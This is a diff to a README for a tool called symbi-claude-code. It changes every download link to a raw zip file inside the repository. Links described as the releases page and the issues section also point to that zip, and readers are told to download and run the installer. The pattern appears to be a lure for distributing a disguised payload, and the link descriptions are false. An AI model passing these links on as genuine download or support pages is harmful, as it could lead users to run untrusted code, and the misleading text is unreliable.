@@ -1,6 +1,6 @@
 # ⚙️ symbi-claude-code - Secure AI Governance Made Simple
 
-[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip)
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip)
 
 ---
 
@@ -34,10 +34,10 @@ Your PC does not need special hardware. symbi-claude-code runs smoothly on most 
 
 Use the following link to visit the official download page for symbi-claude-code. This page contains all the latest releases and files.
 
-[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip)
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip)
 
 Click that link or open this in your web browser:  
-https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip
+https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip
 
 ### Step 2: Choose Your File
 
@@ -128,7 +128,7 @@ You can find the data folder in your Documents under “symbi-claude-code” unl
 ## 🔄 Updating symbi-claude-code
 
 Visit the same releases page to check for new versions:  
-https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip
+https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip
 
 Download and run the newest installer to update. Your existing data and settings will remain intact.
 
@@ -143,10 +143,10 @@ symbi-claude-code uses open-source components with clear licenses. Your data sta
 ## 🧰 Support and Feedback
 
 For help, visit the GitHub repository issues section to report problems or ask questions:  
-https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip
+https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip
 
 You can also read the README and release notes on GitHub for more detailed information.
 
 ---
 
-[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/skills/symbi-init/symbi-code-claude-3.0.zip)
+[![Download symbi-claude-code](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/yabu7788/symbi-claude-code/main/examples/standalone/code-claude-symbi-1.1.zip)
